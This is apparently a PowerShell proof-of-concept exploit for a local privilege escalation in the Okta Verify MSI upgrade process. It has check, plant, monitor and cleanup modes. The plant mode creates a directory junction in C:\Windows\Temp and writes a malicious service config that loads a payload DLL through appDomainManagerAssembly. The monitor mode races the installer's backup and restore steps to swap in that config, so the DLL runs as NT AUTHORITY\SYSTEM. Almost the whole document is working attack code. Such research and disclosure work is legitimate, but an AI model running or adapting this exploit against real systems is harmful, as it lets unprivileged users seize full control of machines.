# Okta Verify MSI Custom Action Config Injection LPE PoC
# -------------------------------------------------------
# This PoC demonstrates that a standard (non-admin) user can hijack the
# Okta Coordinator Service config file during Okta Verify MSI upgrade,
# achieving code execution as NT AUTHORITY\SYSTEM.
#
# The vulnerability is in the backup/restore custom actions in the MSI:
#   - BackupData (immediate CA, seq 1401): copies service config to C:\Windows\Temp\WOV\C\
#   - RestoreData (deferred CA, seq 4001): copies from C:\Windows\Temp\WOV\C\ to Program Files
#   - The backup path is derived from EnvironmentVariableTarget.Machine TEMP = C:\WINDOWS\TEMP
#   - C:\Windows\Temp is writable by standard users (CreateFiles + AppendData)
#   - No integrity verification on the backed-up config file
#   - Standard user can pre-create WOV\C as a junction to a user-controlled directory
#   - File written through junction inherits permissive ACLs from the junction target
#   - Attacker swaps the config between BackupData and RestoreData (wide TOCTOU window)
#
# Attack flow:
#   1. Create C:\Windows\Temp\WOV\ (if not exists) with C\ as junction to attacker dir
#   2. Set Everyone:FullControl on junction target directory
#   3. Place malicious Okta.Coordinator.Service.exe.config in junction target
#   4. Place payload DLL in C:\ProgramData\Okta\ (user-writable)
#   5. Wait for Okta Verify upgrade (auto-update or manual)
#   6. BackupData writes real config through junction (inherits permissive ACLs)
#   7. Monitor and swap with malicious config (FileSystemWatcher)
#   8. RestoreData copies malicious config to Program Files as SYSTEM
#   9. Okta Coordinator Service loads malicious config with appDomainManagerAssembly
#  10. Payload DLL executes as NT AUTHORITY\SYSTEM

param(
    [switch]$Plant,    # Stage 1: Plant the junction and payload files
    [switch]$Monitor,  # Stage 2: Monitor for BackupData write and swap
    [switch]$Check,    # Check if the attack prerequisites are met
    [switch]$Cleanup   # Remove all planted files
)

$ErrorActionPreference = "Stop"

# Paths
$wovDir = "C:\Windows\Temp\WOV"
$wovC = "$wovDir\C"
$attackerDir = Join-Path $env:LOCALAPPDATA "OktaLPE\staging"
$payloadDir = "C:\ProgramData\Okta"
$configName = "Okta.Coordinator.Service.exe.config"
$payloadDll = "OktaLPE.dll"
$markerFile = "C:\ProgramData\Okta\PWNED-BY-LPE.txt"

# Script directory (for payload files)
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

function Write-Banner {
    Write-Host ""
    Write-Host "=== Okta Verify MSI Config Injection LPE PoC ===" -ForegroundColor Cyan
    Write-Host "    Standard User -> NT AUTHORITY\SYSTEM" -ForegroundColor Cyan
    Write-Host ""
}

function Test-Prerequisites {
    Write-Banner
    Write-Host "[*] Checking prerequisites..." -ForegroundColor Yellow

    # Check 1: Not running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "[!] Running as admin -- PoC should be run as standard user" -ForegroundColor Red
    } else {
        Write-Host "[+] Running as standard user: $env:USERNAME" -ForegroundColor Green
    }

    # Check 2: Okta Verify installed
    $svc = Get-Service "Okta Auto Update Service" -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Host "[+] Okta Auto Update Service found (Status: $($svc.Status))" -ForegroundColor Green
    } else {
        Write-Host "[-] Okta Auto Update Service not found" -ForegroundColor Red
        return
    }

    # Check 3: WOV directory state
    if (Test-Path $wovDir) {
        $owner = (Get-Acl $wovDir).Owner
        Write-Host "[*] C:\Windows\Temp\WOV exists (Owner: $owner)" -ForegroundColor Yellow
        if ($owner -match $env:USERNAME) {
            Write-Host "[+] WOV is user-owned -- attack possible" -ForegroundColor Green
        } else {
            Write-Host "[-] WOV is SYSTEM-owned -- cannot use junction attack on existing dir" -ForegroundColor Red
            Write-Host "    Wait for Temp cleanup or test on a machine where WOV doesn't exist" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[+] C:\Windows\Temp\WOV does not exist -- can create with junction" -ForegroundColor Green
    }

    # Check 4: Can write to C:\Windows\Temp
    $testDir = "C:\Windows\Temp\_lpe_test_" + [guid]::NewGuid().ToString("N").Substring(0,8)
    try {
        New-Item -ItemType Directory -Path $testDir -Force | Out-Null
        Remove-Item $testDir -Force
        Write-Host "[+] C:\Windows\Temp is writable by current user" -ForegroundColor Green
    } catch {
        Write-Host "[-] Cannot write to C:\Windows\Temp" -ForegroundColor Red
    }

    # Check 5: ProgramData\Okta writable
    $testFile = "$payloadDir\_lpe_test_" + [guid]::NewGuid().ToString("N").Substring(0,8) + ".txt"
    try {
        Set-Content -Path $testFile -Value "test"
        Remove-Item $testFile -Force
        Write-Host "[+] C:\ProgramData\Okta is writable by current user" -ForegroundColor Green
    } catch {
        Write-Host "[-] Cannot write to C:\ProgramData\Okta" -ForegroundColor Red
    }

    # Check 6: Machine TEMP
    $machineTemp = [Environment]::GetEnvironmentVariable("TEMP", [EnvironmentVariableTarget]::Machine)
    Write-Host "[*] Machine TEMP: $machineTemp" -ForegroundColor Yellow

    # Check 7: Current config
    $configPath = Join-Path ([Environment]::GetFolderPath("ProgramFiles")) "Okta\UpdateService\$configName"
    if (Test-Path $configPath) {
        Write-Host "[*] Current service config at: $configPath" -ForegroundColor Yellow
        $content = Get-Content $configPath -Raw
        if ($content -match "appDomainManager") {
            Write-Host "[!] Config already contains appDomainManager -- may be exploited" -ForegroundColor Red
        } else {
            Write-Host "[+] Config is clean (no appDomainManager)" -ForegroundColor Green
        }
    }

    # Check for marker
    if (Test-Path $markerFile) {
        Write-Host ""
        Write-Host "[!!!] EXPLOITATION MARKER FOUND:" -ForegroundColor Red
        Get-Content $markerFile | ForEach-Object { Write-Host "      $_" -ForegroundColor Red }
    }
}

function Install-Plant {
    Write-Banner
    Write-Host "[*] Stage 1: Planting junction and payload files" -ForegroundColor Yellow

    # Check if WOV already exists and is SYSTEM-owned
    if (Test-Path $wovDir) {
        $owner = (Get-Acl $wovDir).Owner
        if ($owner -notmatch $env:USERNAME) {
            Write-Host "[-] C:\Windows\Temp\WOV already exists (Owner: $owner)" -ForegroundColor Red
            Write-Host "    Cannot plant junction -- WOV is not user-owned" -ForegroundColor Red
            Write-Host "    This machine has already been upgraded. Try after Temp cleanup." -ForegroundColor Yellow
            return
        }
    }

    # Create attacker staging directory with permissive ACLs
    if (!(Test-Path $attackerDir)) {
        New-Item -ItemType Directory -Path $attackerDir -Force | Out-Null
    }
    $acl = Get-Acl $attackerDir
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        "Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.AddAccessRule($rule)
    Set-Acl $attackerDir $acl
    Write-Host "[+] Created staging dir with Everyone:FullControl: $attackerDir" -ForegroundColor Green

    # Place malicious config in staging dir
    $maliciousConfig = @"
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2"/>
    </startup>
  <runtime>
    <appDomainManagerAssembly value="OktaLPE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=5306894e6a9e0bb0" />
    <appDomainManagerType value="OktaLPE.LPEManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="OktaLPE" publicKeyToken="5306894e6a9e0bb0" culture="neutral" />
        <codeBase version="1.0.0.0" href="file:///C:/ProgramData/Okta/OktaLPE.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <appSettings>
    <add key="LogLevel" value="Info"/>
  </appSettings>
</configuration>
"@
    Set-Content -Path (Join-Path $attackerDir $configName) -Value $maliciousConfig
    Write-Host "[+] Placed malicious config in staging dir" -ForegroundColor Green

    # Create WOV directory and C junction
    if (!(Test-Path $wovDir)) {
        New-Item -ItemType Directory -Path $wovDir -Force | Out-Null
        Write-Host "[+] Created C:\Windows\Temp\WOV\" -ForegroundColor Green
    }
    if (!(Test-Path $wovC)) {
        cmd /c mklink /J "$wovC" "$attackerDir" 2>&1 | Out-Null
        if (Test-Path $wovC) {
            Write-Host "[+] Created junction: WOV\C -> $attackerDir" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed to create junction" -ForegroundColor Red
            return
        }
    }

    # Place payload DLL in ProgramData\Okta
    $sourceDll = Join-Path $scriptDir $payloadDll
    if (Test-Path $sourceDll) {
        Copy-Item $sourceDll (Join-Path $payloadDir $payloadDll) -Force
        Write-Host "[+] Placed $payloadDll in $payloadDir" -ForegroundColor Green
    } else {
        Write-Host "[!] Payload DLL not found at $sourceDll" -ForegroundColor Yellow
        Write-Host "    Build with: dotnet build -c Release (from okta-lpe-sn directory)" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "[*] Plant complete. Run with -Monitor to watch for upgrade." -ForegroundColor Cyan
    Write-Host "[*] The next Okta Verify upgrade will trigger the config injection." -ForegroundColor Cyan
}

function Start-Monitor {
    Write-Banner
    Write-Host "[*] Stage 2: Monitoring for BackupData config write" -ForegroundColor Yellow
    Write-Host "[*] Watching: $attackerDir" -ForegroundColor Yellow
    Write-Host "[*] Waiting for Okta Verify upgrade to trigger BackupData..." -ForegroundColor Yellow
    Write-Host "[*] Press Ctrl+C to stop" -ForegroundColor Yellow
    Write-Host ""

    if (!(Test-Path $attackerDir)) {
        Write-Host "[-] Staging dir not found. Run with -Plant first." -ForegroundColor Red
        return
    }

    $configPath = Join-Path $attackerDir $configName
    $maliciousConfig = @"
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2"/>
    </startup>
  <runtime>
    <appDomainManagerAssembly value="OktaLPE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=5306894e6a9e0bb0" />
    <appDomainManagerType value="OktaLPE.LPEManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="OktaLPE" publicKeyToken="5306894e6a9e0bb0" culture="neutral" />
        <codeBase version="1.0.0.0" href="file:///C:/ProgramData/Okta/OktaLPE.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <appSettings>
    <add key="LogLevel" value="Info"/>
  </appSettings>
</configuration>
"@

    # Use FileSystemWatcher to detect when BackupData writes the real config
    $watcher = New-Object System.IO.FileSystemWatcher
    $watcher.Path = $attackerDir
    $watcher.Filter = $configName
    $watcher.NotifyFilter = [System.IO.NotifyFilters]::LastWrite -bor [System.IO.NotifyFilters]::FileName
    $watcher.EnableRaisingEvents = $false

    $swapped = $false

    while (-not $swapped) {
        # Wait for file change event (5 second timeout, then loop)
        $result = $watcher.WaitForChanged([System.IO.WatcherChangeTypes]::Changed -bor [System.IO.WatcherChangeTypes]::Created, 5000)

        if (-not $result.TimedOut) {
            Write-Host "[!] Config file modified by BackupData at $(Get-Date -Format 'HH:mm:ss.fff')" -ForegroundColor Red
            Write-Host "[*] Checking if it was overwritten with real config..." -ForegroundColor Yellow

            Start-Sleep -Milliseconds 100  # Brief pause to let write complete

            $content = Get-Content $configPath -Raw -ErrorAction SilentlyContinue
            if ($content -and ($content -notmatch "appDomainManager")) {
                Write-Host "[+] Real config detected -- swapping with malicious config!" -ForegroundColor Green

                # Swap the file
                try {
                    Remove-Item $configPath -Force
                    Set-Content -Path $configPath -Value $maliciousConfig
                    Write-Host "[+] SWAP COMPLETE at $(Get-Date -Format 'HH:mm:ss.fff')" -ForegroundColor Green
                    Write-Host "[*] RestoreData will now copy our malicious config to Program Files" -ForegroundColor Cyan
                    $swapped = $true
                } catch {
                    Write-Host "[-] Swap failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "[*] File still contains malicious config -- not yet overwritten" -ForegroundColor Yellow
            }
        }
    }

    $watcher.Dispose()

    Write-Host ""
    Write-Host "[*] Now waiting for the service to restart with the injected config..." -ForegroundColor Yellow
    Write-Host "[*] Check for marker file: $markerFile" -ForegroundColor Yellow

    # Poll for marker
    for ($i = 0; $i -lt 120; $i++) {
        Start-Sleep -Seconds 5
        if (Test-Path $markerFile) {
            Write-Host ""
            Write-Host "[!!!] SYSTEM CODE EXECUTION ACHIEVED!" -ForegroundColor Red
            Write-Host ""
            Get-Content $markerFile | ForEach-Object { Write-Host "  $_" -ForegroundColor Red }
            return
        }
        Write-Host "." -NoNewline
    }
    Write-Host ""
    Write-Host "[*] Timeout waiting for marker. Check manually: $markerFile" -ForegroundColor Yellow
}

function Remove-Plant {
    Write-Banner
    Write-Host "[*] Cleaning up planted files" -ForegroundColor Yellow

    # Remove junction first (rmdir, not Remove-Item -Recurse)
    if (Test-Path $wovC) {
        $item = Get-Item $wovC -Force
        if ($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) {
            cmd /c rmdir "$wovC" 2>&1 | Out-Null
            Write-Host "[+] Removed junction: $wovC" -ForegroundColor Green
        }
    }

    # Remove WOV if we own it and it's empty
    if (Test-Path $wovDir) {
        $items = Get-ChildItem $wovDir -ErrorAction SilentlyContinue
        if ($items.Count -eq 0) {
            Remove-Item $wovDir -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed empty WOV dir" -ForegroundColor Green
        } else {
            Write-Host "[*] WOV dir not empty, leaving it" -ForegroundColor Yellow
        }
    }

    # Remove staging dir
    if (Test-Path $attackerDir) {
        Remove-Item $attackerDir -Recurse -Force
        Write-Host "[+] Removed staging dir: $attackerDir" -ForegroundColor Green
    }

    # Remove payload DLL
    $payloadPath = Join-Path $payloadDir $payloadDll
    if (Test-Path $payloadPath) {
        Remove-Item $payloadPath -Force
        Write-Host "[+] Removed payload DLL" -ForegroundColor Green
    }

    # Remove marker
    if (Test-Path $markerFile) {
        Remove-Item $markerFile -Force
        Write-Host "[+] Removed marker file" -ForegroundColor Green
    }

    Write-Host "[+] Cleanup complete" -ForegroundColor Green
}

# Main
if ($Check) { Test-Prerequisites }
elseif ($Plant) { Install-Plant }
elseif ($Monitor) { Start-Monitor }
elseif ($Cleanup) { Remove-Plant }
else {
    Write-Banner
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  .\okta-lpe-poc.ps1 -Check    # Check prerequisites" -ForegroundColor White
    Write-Host "  .\okta-lpe-poc.ps1 -Plant    # Plant junction and payload" -ForegroundColor White
    Write-Host "  .\okta-lpe-poc.ps1 -Monitor  # Watch for upgrade and swap config" -ForegroundColor White
    Write-Host "  .\okta-lpe-poc.ps1 -Cleanup  # Remove all planted files" -ForegroundColor White
    Write-Host ""
    Write-Host "Attack steps:" -ForegroundColor Yellow
    Write-Host "  1. Run -Check to verify prerequisites" -ForegroundColor White
    Write-Host "  2. Run -Plant to set up the junction and payload" -ForegroundColor White
    Write-Host "  3. Run -Monitor to watch for the upgrade trigger" -ForegroundColor White
    Write-Host "  4. Wait for Okta Verify auto-update or manual upgrade" -ForegroundColor White
    Write-Host "  5. Check C:\ProgramData\Okta\PWNED-BY-LPE.txt for SYSTEM exec proof" -ForegroundColor White
}
